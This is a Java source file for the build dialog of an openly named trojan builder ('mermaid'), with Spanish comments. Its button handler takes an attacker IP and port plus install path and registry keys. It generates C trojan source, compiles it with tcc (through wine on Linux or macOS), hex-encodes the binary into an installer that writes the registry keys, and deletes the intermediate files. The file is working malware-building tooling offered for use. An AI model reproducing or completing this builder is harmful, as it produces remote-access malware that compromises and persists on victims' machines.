package tk.clear.mermaid;

import java.io.BufferedInputStream;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

public class Build extends javax.swing.JDialog {
    Profile PROFILE;
    
    public Build(java.awt.Frame parent, boolean modal, Profile recvProfile) {
        super(parent, modal);
        PROFILE = recvProfile;
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        initComponents();
        this.setLocationRelativeTo(null);       // CENTRAR
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        buttonGroup1 = new javax.swing.ButtonGroup();
        buttonGroup2 = new javax.swing.ButtonGroup();
        buttonGroup3 = new javax.swing.ButtonGroup();
        jLabel1 = new javax.swing.JLabel();
        output = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        jCheckBox1 = new javax.swing.JCheckBox();

        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        setTitle("Build");

        jLabel1.setText("Output:");

        output.setFocusable(false);

        jButton1.setText("BUILD");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText("...");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jCheckBox1.setText("UPX");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jLabel1)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(output, javax.swing.GroupLayout.PREFERRED_SIZE, 316, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton2))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(33, 33, 33)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jCheckBox1)
                            .addComponent(jButton1))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(output, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton2))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jCheckBox1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton1)
                .addContainerGap(59, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        String IP = PROFILE.IP;
        String PORT = PROFILE.PORT;
        String PATH = PROFILE.PATH;
        String FILENAME = PROFILE.FILE;
        String HKCU = PROFILE.HKCU;
        String HKLM = PROFILE.HKLM;
        
        // PRIMER PASO: CREAR EL TROYANO
        File choosed = new File(output.getText());
        String choosedPath = choosed.getAbsolutePath();
        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(System.getProperty("file.separator")));
        String[] slatches = raw_slatch_pattern.split(choosedPath);

        String choosedFolderPath = "";
        for(int i=0;i<slatches.length-1;i++){
            choosedFolderPath = choosedFolderPath + slatches[i] + System.getProperty("file.separator");
        }
        
        File trojan = new File(choosedFolderPath + "temp.c");
        
        GenerateTrojan generateTrojan = new GenerateTrojan(trojan, IP, PORT);
        
        COMPILAR(trojan.getAbsolutePath());
        trojan.delete();            // ELIMINAR ARCHIVO temp.c
        
        
        // SEGUNDO PASO: CONVERTIR ARCHIVO COMPILADO A HEXADECIMAL
        File tempEXE = new File(choosedFolderPath + "temp.exe");
        GenerateHexTrojan generateHexTrojan = new GenerateHexTrojan();
        String HEX = generateHexTrojan.GenerateHexTrojan(tempEXE);
        
        tempEXE.delete();           // ELIMINAR ARCHIVO temp.exe
        
        // TERCER PASO: CREAR EL INSTALADOR
        GenerateInstaller generateInstaller = new GenerateInstaller();
        generateInstaller.GenerateInstaller(choosed, PATH, FILENAME, HKCU, HKLM, HEX);
        
        String CFILE = generateInstaller.GetCFILE();
        COMPILAR(CFILE);
        trojan.delete();            // ELIMINAR ARCHIVO final.c
    }//GEN-LAST:event_jButton1ActionPerformed

    private void COMPILAR(String file){
        String tcc = "tcc/tcc.exe";
        tcc = tcc + " "+file;
        tcc = tcc + " ws2_32.def";
        tcc = tcc + " -luser32";
        tcc = tcc + " -lkernel32";

        if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){
            try{
                String command = "wine "+tcc;
                Process p = Runtime.getRuntime().exec(command);
                System.out.println(command);
                p.waitFor();
            } catch (IOException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        } else {
            try{
                Process p = Runtime.getRuntime().exec(tcc); // WINDOWS
            } catch (IOException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        // PEDIR RUTA
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setMultiSelectionEnabled(false);
        String path = "";
        try{
            path = new File(".").getCanonicalPath();
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        File file = new File(path);
        fileChooser.setCurrentDirectory(file);
        fileChooser.showSaveDialog(this);
        
        output.setText(fileChooser.getSelectedFile().getAbsolutePath());
    }//GEN-LAST:event_jButton2ActionPerformed
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.ButtonGroup buttonGroup1;
    private javax.swing.ButtonGroup buttonGroup2;
    private javax.swing.ButtonGroup buttonGroup3;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JCheckBox jCheckBox1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JTextField output;
    // End of variables declaration//GEN-END:variables
}
